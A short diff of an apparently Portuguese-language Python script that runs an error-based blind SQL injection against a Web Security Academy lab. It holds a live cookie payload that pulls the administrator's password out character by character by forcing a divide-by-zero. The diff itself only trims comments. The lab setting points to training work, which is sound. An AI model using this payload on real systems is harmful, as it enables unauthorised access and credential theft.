@@ -99,14 +99,8 @@ url = "https://0a0800ab035dfe87808d3fa400370034.web-security-academy.net/"
 max_requests = 1000
 status_check = 500
 cookie_template = "'||(SELECT CASE WHEN SUBSTR(password,$1,1)='$2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-tamanho_senha = 20  # Defina o comprimento estimado da senha
+tamanho_senha = 20
 
 # Executa o ataque SQLi
 senha_encontrada = sqli_exploit(url, max_requests, status_check, cookie_template, tamanho_senha)
 print(f"Senha final: {senha_encontrada}")
-
-
-# Executa o ataque SQLi
-
-#teste_app = is_vulnerable(url)
-#print(f"A aplicação é: {teste_app}")
